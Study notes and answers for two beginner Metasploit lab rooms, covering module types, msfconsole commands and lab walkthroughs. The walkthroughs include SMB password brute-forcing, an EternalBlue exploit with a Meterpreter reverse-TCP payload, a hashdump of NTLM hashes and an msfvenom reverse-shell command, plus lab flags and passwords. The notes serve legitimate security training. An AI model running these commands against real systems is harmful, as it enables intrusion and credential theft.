These are my notes, answers, and writeups for all the rooms in the Complete Beginner Pathway.

- [Metasploit: Introduction](#Metasploit-Introduction)
  - [Questions](#Questions)
- [Metasploit: Exploitation](#Metasploit-Exploitation)
  - [Questions](#Questions-1)

## Metasploit: Introduction
- **Metasploit** is a tool for pentesting, ranging from enumeration to post-exploitation.
- **Metasploit Framework** is the open-source version that works from the command line.
- Main Components
  - msfconsole - CLI
  - modules - scanners, payloads, exploits, etc.
  - tools - msfvenom
- Definitions
  - vulnerability - a flaw in the target system
  - exploits - code that uses a vulnerability
  - **?** payload - code that runs on target system
- Modules
  - auxiliary - supporting modules like scanners, crawlers
  - encoder - encode exploit and payload to bypass signature-based antivirus
  - evasion - evade antivirus software
  - exploits
  - NOP - does nothing 
  - payload
    - singles - don't need to download additional components to run
    - **?** adapters - wrap single payloads
    - stagers - set up connection between Metasploit and target system
    - stages - downloaded by stagers, allow for larger payloads
  - post - post-exploitation
- `_` for single (in-line) payload, `/` for staged payload
- **msfconsole** is context-based, meaning all module options settings (unless global) will be lost if the module is changed.
- `setg` is `set` for global variables, likewise `unsetg` for `unsetg`
- The exploitation process is 3 steps:
  1. Find the exploit
  1. Customize the exploit
  1. Exploit the vulnerable service

### Questions
#### Task 2
- What is the name of the code taking advantage of a flaw on the target system?
  > Exploit
- What is the name of the code that runs on the target system to achieve the attacker's goal?
  > Payload
- What are self-contained payloads called?
  > Singles
- Is "windows/x64/pingback_reverse_tcp" among singles or staged payload?
  > Singles
#### Task 3
- How would you search for a module related to Apache?
  > search apache
- Who provided the auxiliary/scanner/ssh/ssh_login module?
  ```
  info auxiliary/scanner/ssh/ssh_login
  ```
  > todb
#### Task 4
- How would you set the LPORT value to 6666?
  > set LPORT 6666
- How would you set the global value for RHOSTS to 10.10.19.23 ?
  > setg RHOSTS 10.10.19.23
- What command would you use to clear a set payload?
  > unset payload
- What command do you use to proceed with the exploitation phase?
  > exploit
  
## Metasploit: Exploitation
- `search portscan` - list port scanning modules
- `nmap` scans can be made in `msfconsole` prompt
- Metasploit is **NOT** fast.
- NETBIOS (Network Basic Input Output System) allows computers to communicate over the network to share files or send files to printers.
- The NetBIOS name of the target system can give you an idea about its role and importance.
- Real pentesting will likely have several targets.
  - Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.
    - Start a PostgreSQL database
      ```
      systemctl start postgresq
      msfdb init
      msfconsole
      db_status
      ```
    - The database feature will allow you to create workspaces to isolate different projects.
    - `workspace` - list available workspaces, use `-h` for help
    -  `db_nmap` - runs `nmap`, saving result to database
    -  `hosts`, `services` - information relevant to hosts and services running on target systems
    -  Once the host information is stored in the database, you can use `hosts -R` to add this value to the RHOSTS parameter.
- Finding vulnerabilities using Metasploit rely heavily on your ability to scan and fingerprint the target.
- Choosing a working payload could become a trial and error process.
- `msfvenom` allows you to create payloads in many different formats for many different target systems.
- `msfvenom --list formats` - lists supported output formats
- `use exploit/multi/handler`
  - multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.
  - used to recieve incoming connection from payload
    - set up handler accordingly with payload, lhost, lport of payload, same values
- **Meterpreter** is a powerful tool that offers a lot of easy to use features during the post-exploitation phase.

### Questions
#### Task 2
- How many ports are open on the target system?
  ```
  nmap <target_ip>
  ```
  > 5
- Using the relevant scanner, what NetBIOS name can you see?
  ```
  use auxiliary/scanner/netbios/nbname
  set rhosts <target_ip>
  run
  ```
  > ACME IT SUPPORT
- What is running on port 8000?
  ```
  use auxiliary/scanner/http/http_version
  set rhosts <target_ip>
  set lport 8000
  run
  ```
  > webfs/1.21
- What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.
  ```
  use auxiliary/scanner/smb/smb_login
  set rhosts <target_ip>
  set pass_file <pass_file>
  set smbuser penny
  run
  ```
  > leo1234
#### Task 5
- Exploit one of the critical vulnerabilities on the target VM
  ```
  use exploit/windows/smb/ms17_010_eternalblue
  set payload windows/x64/meterpreter/reverse_tcp
  set rhosts <target_ip>
  run
  ```
- What is the content of the flag.txt file?
  ```
  shell
  cd ../..
  dir /b/s flag.txt
  type C:\Users\Jon\Documents\flag.txt
  ```
  > THM-5455554845
- What is the NTLM hash of the password of the user "pirate"?
  ```
  hashdump
  ```
  > 8ce9a3ebd1647fcc5e04025019f4b875
#### Task 6
- Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<port> -f elf > rev_shell.elf
```

